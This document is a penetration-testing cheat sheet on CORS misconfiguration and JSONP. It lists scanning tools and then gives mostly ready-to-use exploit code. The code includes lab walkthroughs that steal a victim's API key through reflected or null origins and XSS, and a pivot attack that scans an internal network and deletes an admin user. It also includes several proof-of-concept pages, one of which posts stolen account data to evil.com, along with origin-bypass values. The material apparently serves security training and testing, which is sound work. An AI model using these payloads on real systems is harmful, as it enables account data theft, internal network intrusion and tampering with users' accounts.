# CORS

## Tools

```bash
# https://github.com/s0md3v/Corsy
python3 corsy.py -u https://example.com
# https://github.com/chenjj/CORScanner
python cors_scan.py -u example.com
# https://github.com/Shivangx01b/CorsMe
echo "https://example.com" | ./Corsme 
cat subdomains.txt | ./httprobe -c 70 -p 80,443,8080,8081,8089 | tee http_https.txt
cat http_https.txt | ./CorsMe -t 70
# CORSPoc
# https://tools.honoki.net/cors.html
```

| URL accessed | Access permitted? |
| :--- | :--- |
| http://normal-website.com/example/ | Yes: same scheme, domain, and port |
| http://normal-website.com/example2/ | Yes: same scheme, domain, and port |
| https://normal-website.com/example/ | No: different scheme and port |
| http://en.normal-website.com/example/ | No: different domain |
| http://www.normal-website.com/example/ | No: different domain |
| http://normal-website.com:8080/example/ | No: different port |

{% hint style="info" %}
In any site disclosing users & passwords \(or other sensitive info\), try CORS.
{% endhint %}

```text
# Simple test
curl --head -s 'http://example.com/api/v1/secret' -H 'Origin: http://evil.com'

# There are various exceptions to the same-origin policy:
• Some objects are writable but not readable cross-domain, such as the location object or the location.href property from iframes or new windows.
• Some objects are readable but not writable cross-domain, such as the length property of the window object (which stores the number of frames being used on the page) and the closed property.
• The replace function can generally be called cross-domain on the location object.
• You can call certain functions cross-domain. For example, you can call the functions close, blur and focus on a new window. The postMessage function can also be called on iframes and new windows in order to send messages from one domain to another.

# Access-Control-Allow-Origin header is included in the response from one website to a request originating from another website, and identifies the permitted origin of the request. A web browser compares the Access-Control-Allow-Origin with the requesting website's origin and permits access to the response if they match.

CORS good example:
https://hackerone.com/reports/235200

- CORS with basic origin reflection:

    With your browser proxying through Burp Suite, turn intercept off, log into your account, and click "Account Details".
    Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
    Send the request to Burp Repeater, and resubmit it with the added header: Origin: https://example.com
    Observe that the origin is reflected in the Access-Control-Allow-Origin header.
    Now browse to the exploit server, enter the following HTML, replacing $url with the URL for your specific lab and test it by clicking "view exploit":
    <script>
       var req = new XMLHttpRequest();
       req.onload = reqListener;
       req.open('get','$url/accountDetails',true);
       req.withCredentials = true;
       req.send();

       function reqListener() {
           location='/log?key='+this.responseText;
       };
    </script>
    Observe that the exploit works - you have landed on the log page and your API key is in the URL.
    Go back to the exploit server and click "Deliver exploit to victim".
    Click "Access log", retrieve and submit the victim's API key to complete the lab.

 - Whitelisted null origin value

     With your browser proxying through Burp Suite, turn intercept off, log into your account, and click "My account".
    Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
    Send the request to Burp Repeater, and resubmit it with the added header Origin: null.
    Observe that the "null" origin is reflected in the Access-Control-Allow-Origin header.
    Now browse to the exploit server, enter the following HTML, replacing $url with the URL for your specific lab, $exploit-server-url with the exploit server URL, and test it by clicking "view exploit":
    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
       var req = new XMLHttpRequest ();
       req.onload = reqListener;
       req.open('get','$url/accountDetails',true);
       req.withCredentials = true;
       req.send();

       function reqListener() {
           location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText);
       };
    </script>"></iframe>
    Notice the use of an iframe sandbox as this generates a null origin request. Observe that the exploit works - you have landed on the log page and your API key is in the URL.
    Go back to the exploit server and click "Deliver exploit to victim".
    Click "Access log", retrieve and submit the victim's API key to complete the lab.

- CORS with insecure certificate

    With your browser proxying through Burp Suite, turn intercept off, log into your account, and click "Account Details".
    Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
    Send the request to Burp Repeater, and resubmit it with the added header Origin: http://subdomain.lab-id where lab-id is the lab domain name.
    Observe that the origin is reflected in the Access-Control-Allow-Origin header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.
    Open a product page, click "Check stock" and observe that it is loaded using a HTTP URL on a subdomain.
    Observe that the productID parameter is vulnerable to XSS.
    Now browse to the exploit server, enter the following HTML, replacing $your-lab-url with your unique lab URL and $exploit-server-url with your exploit server URL and test it by clicking "view exploit":
    <script>
       document.location="http://stock.$your-lab-url/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://$your-lab-url/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://$exploit-server-url/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
    </script>
    Observe that the exploit works - you have landed on the log page and your API key is in the URL.
    Go back to the exploit server and click "Deliver exploit to victim".
    Click "Access log", retrieve and submit the victim's API key to complete the lab.

- CORS with pivot attack

Step 1
First we need to scan the local network for the endpoint. Replace $collaboratorPayload with your own Collaborator payload or exploit server URL. Enter the following code into the exploit server. Click store then "Deliver exploit to victim". Inspect the log or the Collaborator interaction and look at the code parameter sent to it.
<script>
var q = [], collaboratorURL = 'http://$collaboratorPayload';
for(i=1;i<=255;i++){
  q.push(
  function(url){
    return function(wait){
    fetchUrl(url,wait);
    }
  }('http://192.168.0.'+i+':8080'));
}
for(i=1;i<=20;i++){
  if(q.length)q.shift()(i*100);
}
function fetchUrl(url, wait){
  var controller = new AbortController(), signal = controller.signal;
  fetch(url, {signal}).then(r=>r.text().then(text=>
    {
    location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
  }
  ))
  .catch(e => {
  if(q.length) {
    q.shift()(wait);
  }
  });
  setTimeout(x=>{
  controller.abort();
  if(q.length) {
    q.shift()(wait);
  }
  }, wait);
}
</script>
Step 2
Clear the code from stage 1 and enter the following code in the exploit server. Replace $ip with the IP address and port number retrieved from your collaborator interaction. Don't forget to add your Collaborator payload or exploit server URL again. Update and deliver your exploit. We will now probe the username field for an XSS vulnerability. You should retrieve a Collaborator interaction with foundXSS=1 in the URL or you will see foundXSS=1 in the log.
<script>
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url, collaboratorURL){
  fetch(url).then(r=>r.text().then(text=>
  {
    xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
  }
  ))
}

fetchUrl("http://$ip", "http://$collaboratorPayload");
</script>

Step 3
Clear the code from stage 2 and enter the following code in the exploit server. Replace $ip with the same IP address and port number as in step 2 and don't forget to add your Collaborator payload or exploit server again. Update and deliver your exploit. Your Collaborator interaction or your exploit server log should now give you the source code of the admin page.
<script>
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}
function fetchUrl(url, collaboratorURL){
  fetch(url).then(r=>r.text().then(text=>
  {
    xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
  }
  ))
}

fetchUrl("http://$ip", "http://$collaboratorPayload");
</script>
Step 4
Read the source code retrieved from step 3 in your Collaborator interaction or on the exploit server log. You'll notice there's a form that allows you to delete a user. Clear the code from stage 3 and enter the following code in the exploit server. Replace $ip with the same IP address and port number as in steps 2 and 3. The code submits the form to delete carlos by injecting an iframe pointing to the /admin page.
<script>
function xss(url, text, vector) {
  location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}

function fetchUrl(url){
  fetch(url).then(r=>r.text().then(text=>
  {
    xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
  }
  ))
}

fetchUrl("http://$ip");
</script>
Click on "Deliver exploit to victim" to submit the code. Once you have submitted the form to delete user carlos then you have completed the lab.

# JSONP

In GET URL append “?callback=testjsonp”
Response should be:
testjsonp(<json-data>)

# Bypasses
Origin:null
Origin:attacker.com
Origin:attacker.target.com
Origin:attackertarget.com
Origin:sub.attackertarget.com
```

## **CORS PoC**

```text
<!DOCTYPE html>
<html>
<head>
<title>CORS PoC Exploit</title>
</head>
<body>
<center>

<h1>CORS Exploit<br>six2dez</h1>
<hr>
<div id="demo">
<button type="button" onclick="cors()">Exploit</button>
</div>
<script type="text/javascript">
 function cors() {
   var xhttp = new XMLHttpRequest();
   xhttp.onreadystatechange = function() {
     if(this.readyState == 4 && this.status == 200) {
        document.getElementById("demo").innerHTML = this.responseText;
     }
   };
 xhttp.open("GET", "http://<vulnerable-url>", true);
 xhttp.withCredentials = true;
 xhttp.send();
 }
</script>

</center>
</body>
</html>
```

## **CORS PoC 2**

```text
<html>
<script>
var http = new XMLHttpRequest();
var url = 'Url';//Paste here Url
var params = 'PostData';//Paste here POST data
http.open('POST', url, true);

//Send the proper header information along with the request
http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

http.onreadystatechange = function() {//Call a function when the state changes.
    if(http.readyState == 4 && http.status == 200) {
        alert(http.responseText);
    }
}
http.send(params);

</script>
</html>
```

## CORS PoC 3 - Sensitive Data Leakage

```text
<html>
<body>
<button type='button' onclick='cors()'>CORS</button>
<p id='corspoc'></p>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
var a = this.responseText; // Sensitive data from target1337.com about user account
document.getElementById("corspoc").innerHTML = a;
xhttp.open("POST", "https://evil.com", true);// Sending that data to Attacker's website
xhttp.withCredentials = true;
console.log(a);
xhttp.send("data="+a);
}
};
xhttp.open("POST", "https://target1337.com", true);
xhttp.withCredentials = true;
var body = "requestcontent";
var aBody = new Uint8Array(body.length);
for (var i = 0; i < aBody.length; i++)
aBody[i] = body.charCodeAt(i); 
xhttp.send(new Blob([aBody]));
}
</script>
</body>
</html>
```

## **CORS JSON PoC**

```text
<!DOCTYPE html>
<html>
<head>
<title>JSONP PoC</title>
</head>
<body>
<center>

<h1>JSONP Exploit<br>YourTitle</h1>
<hr>
<div id="demo">
<button type="button" onclick="trigger()">Exploit</button>
</div>
<script>

function testjsonp(myObj) {
  var result = JSON.stringify(myObj)
  document.getElementById("demo").innerHTML = result;
  //console.log(myObj)
}

</script>

<script >

  function trigger() {
    var s = document.createElement("script");
    s.src = "https://<vulnerable-endpoint>?callback=testjsonp";
    document.body.appendChild(s);
}

</script>
</body>
</html>
```

